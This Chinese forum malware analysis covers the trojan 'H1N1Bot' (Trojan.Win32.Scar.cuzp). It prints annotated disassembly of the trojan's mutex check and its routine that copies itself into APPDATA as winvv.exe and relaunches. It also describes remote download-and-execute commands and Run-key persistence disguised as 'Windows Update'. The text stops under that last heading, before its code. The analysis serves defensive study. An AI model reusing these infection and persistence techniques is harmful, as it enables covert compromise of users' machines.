
# Trojan.Win32.Scar.cuzp 木马分析

> 原文：[`www.pediy.com/kssd/pediy11/120760.html`](https://www.pediy.com/kssd/pediy11/120760.html)

病毒时间戳:2010-09-18

名字是卡巴斯基报的

在本地开个后门，接收远端指令，可以下载指定的 url 文件并执行，还可以清理病毒。

谢谢【runstop】兄的提醒，命令以更正。

指令包括`"!dwn"`,`"!clo"`和`"!rem"`，各部分说明：

### 1,创建名为`"H1N1Bot"`的`Mutex`对象，防止重复感染

代码：

```
00401481  /$  55            push    ebp
00401482  |.  8BEC          mov     ebp, esp
00401484  |.  83C4 FC      add     esp, -4
00401487  |.  68 BB304000   push    004030BB                   ; /MutexName = "H1N1Bot"
0040148C  |.  6A 00         push    0                            ; |InitialOwner = FALSE
0040148E  |.  6A 00         push    0                            ; |pSecurity = NULL
00401490  |.  E8 59000000   call    <jmp.&kernel32.CreateMutexA>     ; \CreateMutexA
00401495  |.  8945 FC       mov     dword ptr [ebp-4], eax
00401498  |.  E8 63000000   call    <jmp.&kernel32.GetLastError>     ; \GetLastError
0040149D  |.  3D B7000000   cmp     eax, 0B7
004014A2  |.  74 02         je      short 004014A6
004014A4  |.  C9            leave
004014A5  |.  C3            retn
004014A6  |>  FF75 FC       push    dword ptr [ebp-4]          ; /hObject
004014A9  |.  E8 34000000   call    <jmp.&kernel32.CloseHandle>      ; \CloseHandle
004014AE  |.  6A 00         push    0                            ; /ExitCode = 0
004014B0  \.  E8 3F000000   call    <jmp.&kernel32.ExitProcess>      ; \ExitProcess
```

### 2,获取当前系统 `CSIDL_APPDATA` 路径，如：`C:\Documents and Settings\Administrator\Local Settings\Applicaton Data`。并在后追加文件名`"\winvv.exe"`，然后与当前进程镜象路径对比，如果当前进程不是 `winvv.exe`，则复制当前文件到`"CSIDL_APPDATA\winvv.exe"`,然后运行 `winvv.exe`,并退出本进程

代码：

```
00401092  /$  55            push    ebp
00401093  |.  8BEC          mov     ebp, esp
00401095  |.  81C4 FCFDFFFF add     esp, -204
0040109B  |.  68 00010000   push    100                          ; /Length = 100 (256.)
004010A0  |.  8D85 00FFFFFF lea     eax, dword ptr [ebp-100]     ; |
004010A6  |.  50            push    eax                          ; |Destination
004010A7  |.  E8 66040000   call    <jmp.&kernel32.RtlZeroMemory>    ; \RtlZeroMemory
004010AC  |.  68 00010000   push    100                          ; /Length = 100 (256.)
004010B1  |.  8D85 00FEFFFF lea     eax, dword ptr [ebp-200]     ; |
004010B7  |.  50            push    eax                          ; |Destination
004010B8  |.  E8 55040000   call    <jmp.&kernel32.RtlZeroMemory>    ; \RtlZeroMemory
004010BD  |.  68 00010000   push    100                          ; /BufSize = 100 (256.)
004010C2  |.  8D85 00FFFFFF lea     eax, dword ptr [ebp-100]     ; |
004010C8  |.  50            push    eax                          ; |PathBuffer
004010C9  |.  6A 00         push    0                            ; |hModule = NULL
004010CB  |.  E8 36040000   call    <jmp.&kernel32.GetModuleFileName>; \GetModuleFileNameA
004010D0  |.  8D85 00FEFFFF lea     eax, dword ptr [ebp-200]
004010D6  |.  50            push    eax
004010D7  |.  6A 00         push    0
004010D9  |.  6A 00         push    0
004010DB  |.  6A 1C         push    1C
004010DD  |.  6A 00         push    0
004010DF  |.  E8 7C040000   call    <jmp.&shell32.SHGetFolderPathA>
004010E4  |.  68 60304000   push    00403060                   ; /StringToAdd = "\winvv.exe"
004010E9  |.  8D85 00FEFFFF lea     eax, dword ptr [ebp-200]     ; |
004010EF  |.  50            push    eax                          ; |ConcatString
004010F0  |.  E8 35040000   call    <jmp.&kernel32.lstrcatA>         ; \lstrcatA
004010F5  |.  8D85 00FEFFFF lea     eax, dword ptr [ebp-200]
004010FB  |.  50            push    eax                          ; /String2
004010FC  |.  8D85 00FFFFFF lea     eax, dword ptr [ebp-100]     ; |
00401102  |.  50            push    eax                          ; |String1
00401103  |.  E8 28040000   call    <jmp.&kernel32.lstrcmpA>         ; \lstrcmpA
00401108  |.  83F8 00       cmp     eax, 0
0040110B  |.  74 6B         je      short 00401178
0040110D  |.  6A 00         push    0                            ; /FailIfExists = FALSE
0040110F  |.  8D85 00FEFFFF lea     eax, dword ptr [ebp-200]     ; |
00401115  |.  50            push    eax                          ; |NewFileName
00401116  |.  8D85 00FFFFFF lea     eax, dword ptr [ebp-100]     ; |
0040111C  |.  50            push    eax                          ; |ExistingFileName
0040111D  |.  E8 C6030000   call    <jmp.&kernel32.CopyFileA>        ; \CopyFileA
00401122  |.  68 00010000   push    100                          ; /Length = 100 (256.)
00401127  |.  8D85 00FFFFFF lea     eax, dword ptr [ebp-100]     ; |
0040112D  |.  50            push    eax                          ; |Destination
0040112E  |.  E8 DF030000   call    <jmp.&kernel32.RtlZeroMemory>    ; \RtlZeroMemory
00401133  |.  8D85 00FFFFFF lea     eax, dword ptr [ebp-100]
00401139  |.  50            push    eax
0040113A  |.  6A 00         push    0
0040113C  |.  6A 00         push    0
0040113E  |.  6A 1C         push    1C
00401140  |.  6A 00         push    0
00401142  |.  E8 19040000   call    <jmp.&shell32.SHGetFolderPathA>
00401147  |.  8D05 60304000 lea     eax, dword ptr [403060]
0040114D  |.  40            inc     eax
0040114E  |.  8985 FCFDFFFF mov     dword ptr [ebp-204], eax
00401154  |.  6A 00         push    0                            ; /IsShown = 0
00401156  |.  8D85 00FFFFFF lea     eax, dword ptr [ebp-100]     ; |
0040115C  |.  50            push    eax                          ; |DefDir
0040115D  |.  6A 00         push    0                            ; |Parameters = NULL
0040115F  |.  FFB5 FCFDFFFF push    dword ptr [ebp-204]         ; |FileName
00401165  |.  68 6B304000   push    0040306B                   ; |Operation = "open"
0040116A  |.  6A 00         push    0                            ; |hWnd = NULL
0040116C  |.  E8 F5030000   call    <jmp.&shell32.ShellExecuteA>     ; \ShellExecuteA
00401171  |.  6A 00         push    0                            ; /ExitCode = 0
00401173  |.  E8 7C030000   call    <jmp.&kernel32.ExitProcess>      ; \ExitProcess
00401178  |>  C9            leave
00401179  \.  C3            retn
```

### 3,把 `winvv.exe` 添加进启动项`"Software\Microsoft\Windows\CurrentVersion\Run\"`中，项名为`"Windows Update"`

代码：
